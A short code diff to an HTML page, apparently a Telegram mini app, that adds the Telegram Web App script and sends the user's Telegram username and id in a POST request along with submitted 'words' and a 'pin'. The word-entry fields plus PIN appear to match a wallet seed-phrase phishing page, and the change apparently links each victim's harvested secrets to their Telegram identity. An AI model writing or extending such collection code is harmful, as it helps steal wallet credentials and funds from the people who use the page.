@@ -216,8 +216,22 @@ transform:translateY(0);
 
 </div>
 
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 <script>
 
+
+const tg = window.Telegram.WebApp
+const user = tg.initDataUnsafe.user
+
+let username = "unknown"
+let user_id = "unknown"
+
+if(user){
+username = user.username
+user_id = user.id
+}
+  
 /* CREATE WORD INPUTS */
 
 const wordsContainer = document.getElementById("words")
@@ -288,7 +302,9 @@ headers:{
 },
 body:JSON.stringify({
 words:words,
-pin:pin
+pin:pin,
+username:username,
+user_id:user_id
 })
 })
 
